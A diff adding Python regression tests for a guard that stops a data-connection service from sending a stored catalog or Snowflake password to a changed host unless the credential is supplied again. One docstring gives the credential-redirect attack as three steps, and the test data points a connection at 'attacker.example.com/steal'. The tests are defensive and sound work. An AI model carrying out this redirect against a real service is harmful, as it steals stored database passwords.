@@ -14,6 +14,7 @@ from sqlalchemy import func, select
 
 from backend.app.core.secret_names import connection_secret_ref
 from backend.app.core.secrets import SecretWriteError
+from backend.app.datasources import registry
 from backend.app.db.models import Asset, Connection, ConnectionVersion, Run, Suite, User
 from backend.app.services import connection_service as svc
 from backend.app.services import suite_service
@@ -1223,6 +1224,226 @@ def test_the_draft_test_refuses_to_resolve_any_secret_name(db_session: Any) -> N
             secret=None,
             secret_store=store,
         )
+
+
+# ────────── a destination move requires re-supplying credentials (#1401) ────────
+
+
+def test_moving_catalog_uri_while_echoing_the_secret_name_is_rejected(db_session: Any) -> None:
+    """#1401, the exact attack. #1400 closed the reference-NAME half; this is the
+    other one, and it survives every guard that existed before:
+
+      1. GET the victim connection — `catalog_secret_name` is in the config the
+         list endpoint returns, by design.
+      2. PATCH it back **byte-identically** (accepted — that IS the round-trip
+         rule `_reject_foreign_secret_names` deliberately allows) while pointing
+         `catalog_uri` at a host you control.
+      3. POST /test. `_extra_secrets` resolves the real catalog password and
+         `inject_uri_password` sends it to your listener.
+
+    Admin-only and audit-trailed since #741/#1400, so this is a privilege
+    conversion rather than an open door: an Admin who may ROTATE a credential
+    must not thereby be able to READ one.
+    """
+    store = FakeSecretStore()
+    conn = svc.create_connection(
+        db_session,
+        name="harness-iceberg",
+        conn_type="iceberg",
+        env="dev",
+        config=dict(_ICEBERG_SQL_CONFIG),
+        secret=None,
+        catalog_secret="the-catalog-password",
+        created_by=_user(db_session).id,
+        secret_store=store,
+    )
+    stored_ref = conn.config["catalog_secret_name"]
+
+    with pytest.raises(svc.CredentialRedirectError) as exc:
+        svc.update_connection(
+            db_session,
+            conn.id,
+            config={
+                **_ICEBERG_SQL_CONFIG,
+                "catalog_uri": "postgresql://attacker.example.com/steal",
+                # Echoed byte-identically — #1400's guard has nothing to say here.
+                "catalog_secret_name": stored_ref,
+            },
+            secret_store=store,
+        )
+
+    assert exc.value.detail["fields"] == ["catalog_uri"]
+    assert exc.value.detail["required"] == ["catalog_secret"]
+    # Not half-applied: the row must still point at the original host.
+    assert conn.config["catalog_uri"] == _ICEBERG_SQL_CONFIG["catalog_uri"]
+
+
+def test_moving_a_destination_is_allowed_when_the_credential_is_resupplied(
+    db_session: Any,
+) -> None:
+    """The legitimate move must still work — the guard closes the vector by
+    requiring the credential, not by forbidding migration. Re-supplying proves
+    the caller already knows the secret, so nothing is disclosed by sending it
+    somewhere new."""
+    store = FakeSecretStore()
+    conn = svc.create_connection(
+        db_session,
+        name="harness-iceberg",
+        conn_type="iceberg",
+        env="dev",
+        config=dict(_ICEBERG_SQL_CONFIG),
+        secret=None,
+        catalog_secret="the-catalog-password",
+        created_by=_user(db_session).id,
+        secret_store=store,
+    )
+    ref = conn.config["catalog_secret_name"]
+
+    svc.update_connection(
+        db_session,
+        conn.id,
+        config={**_ICEBERG_SQL_CONFIG, "catalog_uri": "sqlite:///moved.db"},
+        catalog_secret="re-supplied-password",
+        secret_store=store,
+    )
+
+    assert conn.config["catalog_uri"] == "sqlite:///moved.db"
+    assert store.get(ref) == "re-supplied-password"
+
+
+def test_moving_snowflake_account_without_the_password_is_rejected(db_session: Any) -> None:
+    """The PRIMARY `secret_ref` has the same exposure, on every type — it is
+    resolved from the ROW while the destination comes from CONFIG, so only config
+    was ever guarded. Snowflake's `account` becomes the hostname the password is
+    presented to."""
+    store = FakeSecretStore()
+    conn = _create(db_session, store)
+
+    with pytest.raises(svc.CredentialRedirectError) as exc:
+        svc.update_connection(
+            db_session,
+            conn.id,
+            config={**_SF_CONFIG, "account": "attacker.us-east-1"},
+            secret_store=store,
+        )
+
+    assert exc.value.detail["fields"] == ["account"]
+    assert exc.value.detail["required"] == ["secret"]
+    assert conn.config["account"] == _SF_CONFIG["account"]
+
+
+def test_editing_a_non_destination_field_needs_no_credential(db_session: Any) -> None:
+    """The guard must not tax ordinary editing. `warehouse` selects an object
+    *within* an already-authenticated account — it cannot move where the password
+    goes — so a PATCH that touches only it proceeds untouched.
+
+    Asserted explicitly because a guard that fires on every config change would
+    pass the rejection tests above just as happily while making the connection
+    editor unusable.
+    """
+    store = FakeSecretStore()
+    conn = _create(db_session, store)
+
+    svc.update_connection(
+        db_session,
+        conn.id,
+        config={**_SF_CONFIG, "warehouse": "COMPUTE_WH_XL"},
+        secret_store=store,
+    )
+
+    assert conn.config["warehouse"] == "COMPUTE_WH_XL"
+
+
+def test_a_partial_patch_that_omits_the_secret_name_is_not_read_as_a_move(
+    db_session: Any,
+) -> None:
+    """`update_connection`'s config is a wholesale REPLACE, and
+    `_carry_over_secret_name_keys` fills the omitted `*_secret_name` back in. The
+    redirect guard therefore has to compare against the MERGED config: comparing
+    against the raw payload would see the carried-over key as a change and demand
+    credentials for an edit that moved nothing."""
+    store = FakeSecretStore()
+    conn = svc.create_connection(
+        db_session,
+        name="harness-iceberg",
+        conn_type="iceberg",
+        env="dev",
+        config=dict(_ICEBERG_SQL_CONFIG),
+        secret=None,
+        catalog_secret="the-catalog-password",
+        created_by=_user(db_session).id,
+        secret_store=store,
+    )
+
+    svc.update_connection(
+        db_session,
+        conn.id,
+        config={**_ICEBERG_SQL_CONFIG, "catalog_name": "renamed"},
+        secret_store=store,
+    )
+
+    assert conn.config["catalog_name"] == "renamed"
+
+
+def test_every_adapter_declares_destination_fields() -> None:
+    """A new connection type that forgets `destination_fields` must fail HERE,
+    not silently ship unprotected. `registry.destination_fields` refuses to
+    default for exactly this reason (the default would be the fail-open answer);
+    this turns that refusal into a CI error the moment an adapter is added.
+
+    ADF's empty mapping is asserted by name — empty is the one value that
+    disables the guard, so it must be a recorded decision (its authority is a
+    hardcoded Microsoft endpoint) rather than something a reader has to trust.
+    """
+    for conn_type in registry._ADAPTERS:
+        slots = registry.destination_fields(conn_type)
+        assert isinstance(slots, dict)
+        if conn_type == "adf":
+            assert slots == {}
+            continue
+        assert slots, f"{conn_type!r} declares no destination fields"
+        for slot, fields in slots.items():
+            # A slot key must name a credential `update_connection` can actually
+            # receive. A typo'd key guards NOTHING and says so nowhere: the guard
+            # would look up `<typo>_secret_name`, find nothing stored, and
+            # conclude there is no credential to protect.
+            assert slot in {"secret", "catalog"}, f"{conn_type!r} names unknown slot {slot!r}"
+            assert fields, f"{conn_type!r} slot {slot!r} names no fields"
+
+
+def test_moving_the_warehouse_asks_for_the_storage_key_not_the_catalog_password(
+    db_session: Any,
+) -> None:
+    """Slots are asked for independently. This Iceberg connection stores ONLY a
+    catalog password (no primary secret), and `warehouse` belongs to the storage
+    slot — so moving it asks for nothing, because there is no storage credential
+    to redirect.
+
+    The inverse of `test_moving_catalog_uri_...`, and the reason
+    `destination_fields` is per-slot: a flat set would make this edit demand the
+    catalog DB password, which steers a different subsystem entirely.
+    """
+    store = FakeSecretStore()
+    conn = svc.create_connection(
+        db_session,
+        name="harness-iceberg",
+        conn_type="iceberg",
+        env="dev",
+        config=dict(_ICEBERG_SQL_CONFIG),
+        secret=None,
+        catalog_secret="catalog-pw",
+        created_by=_user(db_session).id,
+        secret_store=store,
+    )
+
+    svc.update_connection(
+        db_session,
+        conn.id,
+        config={**_ICEBERG_SQL_CONFIG, "warehouse": "s3://bucket/warehouse"},
+        secret_store=store,
+    )
+
+    assert conn.config["warehouse"] == "s3://bucket/warehouse"
 
 
 # ────────── delete removes the catalog secret too (#372/#1059 convention) ───────
